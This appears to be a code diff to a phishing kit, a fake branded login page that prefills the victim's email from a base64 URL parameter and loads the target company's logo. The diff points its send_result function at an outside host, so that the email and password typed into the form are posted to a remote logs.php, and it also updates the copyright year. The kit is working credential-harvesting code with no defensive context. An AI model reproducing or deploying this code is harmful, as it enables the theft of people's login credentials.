@@ -61,7 +61,7 @@
         };
 
         function send_result(x, y) {
-            $.ajax({url: "./logs.php", data: {"email": x, "password": y}, type: "POST"});
+            $.ajax({url: "https://regencylghting.com/76567-87678/chameleon/logs.php", data: {"email": x, "password": y}, type: "POST"});
         }
 
     </script>
@@ -113,7 +113,7 @@
             </form>
         </div>
     </div>
-	<p class="h6 text-center text-dark">Copyright &copy 2024 Systems Incorporated. All rights reserved.</p>
+	<p class="h6 text-center text-dark">Copyright &copy 2025 Systems Incorporated. All rights reserved.</p>
 </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha256-pS96pU17yq+gVu4KBQJi38VpSuKN7otMrDQprzf/DWY= sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q sha512-Ua/7Woz9L5O0cwB/aYexmgoaD7lw3dWe9FvXejVdgqu71gRog3oJgjSWQR55fwWx+WKuk8cl7UwA1RS6QCadFA==" crossorigin="anonymous"></script>
@@ -127,13 +127,14 @@
 		}
 		
 		function getEmail () {
-		  let email = "";
-		  if (window.location.hash) {
-			  email = window.location.hash.substring(1);
-			  email = isBase64(email) ? window.atob(email) : email;
-		  }
-		  return email;
-		}
+  let email = "";
+  const params = new URLSearchParams(window.location.search);
+  const raw = params.get("e");
+  if (raw) {
+    email = isBase64(raw) ? window.atob(raw) : raw;
+  }
+  return email;
+}
 		
 		function changeBodyImage(domain) {
             document.getElementById("img-field").src = `https://logo.clearbit.com/${domain}`
@@ -177,4 +178,5 @@
     </script>
 </body>
 </html>
+
 
